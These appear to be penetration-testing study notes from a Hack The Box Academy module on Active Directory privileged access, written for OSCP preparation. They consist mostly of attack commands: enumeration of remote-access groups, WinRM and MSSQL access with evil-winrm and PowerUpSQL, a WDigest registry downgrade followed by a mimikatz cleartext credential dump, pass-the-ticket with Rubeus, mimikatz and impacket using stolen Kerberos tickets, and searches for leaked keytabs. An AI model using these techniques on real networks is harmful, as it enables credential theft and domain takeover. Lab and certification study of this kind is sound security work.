# Section 23: Privileged Access

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1275
- Code/command blocks: 12

> Terminal output is omitted; only commands & scripts are captured.

```powershell
Get-NetLocalGroupMember -ComputerName {{COMPUTER_NAME}} -GroupName "Remote Desktop Users"
```

```powershell
Get-NetLocalGroupMember -ComputerName {{COMPUTER_NAME}} -GroupName "Remote Management Users"
```

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

```powershell
$password = ConvertTo-SecureString "{{PASSWORD}}" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("{{DOMAIN_NB}}\{{USERNAME}}", $password)
Enter-PSSession -ComputerName {{COMPUTER_NAME}} -Credential $cred

```

```bash
gem install evil-winrm
```

```bash
evil-winrm 
```

```bash
evil-winrm -i {{TARGET_IP}} -u {{USERNAME}}
```

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

```powershell
cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
 Get-SQLInstanceDomain
```

```powershell
 Get-SQLQuery -Verbose -Instance "{{TARGET_IP}},1433" -username "{{DOMAIN_NB}}\{{USERNAME}}" -password "{{PASSWORD}}" -query 'Select @@version'
```

```bash
impacket-mssqlclient 
```

```bash
impacket-mssqlclient {{DOMAIN_NB}}/{{USERNAME}}@{{TARGET_IP}} -windows-auth
```

## WDigest downgrade (force cleartext creds into LSASS)

> Needs **local admin / SYSTEM**. Since Win8.1/2012R2 WDigest no longer caches plaintext in memory; `UseLogonCredential=1` re-enables it, so future logons leave **cleartext** passwords for mimikatz. Only affects **new** logons → reboot or wait for a privileged user. Noisy/slow — on OSCP the NT hash from a normal dump is usually enough, so use this only when you specifically need the plaintext. Set back to `0` to clean up.

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
shutdown.exe /r /t 0 /f
```

```powershell
# after a privileged logon, read the cleartext from memory
.\mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
```

```cmd
:: cleanup — restore the default
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0
```

## Pass-the-Ticket (reuse a stolen/leaked ticket)

> Found a Kerberos ticket or keytab (in a share, `/tmp`, a backup)? Reuse it directly — tickets are **not machine-bound**, so import on any box and you're that principal. Treat a `.ccache`/`.kirbi`/`.keytab` like finding a password. Stealing/reusing a leaked ticket is in scope; *forging* golden tickets is out-of-scope persistence.

### Reuse caveats

- Real cached **TGT** (`/tmp/krb5cc_*`) — good ~10 h, renewable ~7 days. Grab it fast.
- Leaked **Golden Ticket** file — valid for its forged lifetime (mimikatz default **10 years**), survives password changes; only dies when krbtgt rotates twice.
- **Keytab** (`.keytab`) — holds long-term keys → mint fresh tickets until the password rotates. Better than a single ticket.

### Linux — import a ccache and use it

```bash
export KRB5CCNAME=/path/to/stolen.ccache
klist                                     # confirm valid + not expired
impacket-psexec -k -no-pass {{DOMAIN}}/{{USERNAME}}@{{COMPUTER_NAME}}
```

### Windows — pass the ticket into memory

```powershell
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

```powershell
mimikatz # kerberos::ptt ticket.kirbi
```

### Convert between formats (.kirbi <-> .ccache)

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
```

### Where tickets/keytabs leak

```bash
# hunt on a Linux foothold
ls -la /tmp/krb5cc_* 2>/dev/null
find / -name '*.keytab' 2>/dev/null
```

> On Windows shares, surface leftover `.kirbi`/`.keytab` with Snaffler ([15](15-credentialed-enumeration-from-windows.md)) or `crackmapexec -M spider_plus` ([14](14-credentialed-enumeration-from-linux.md)).

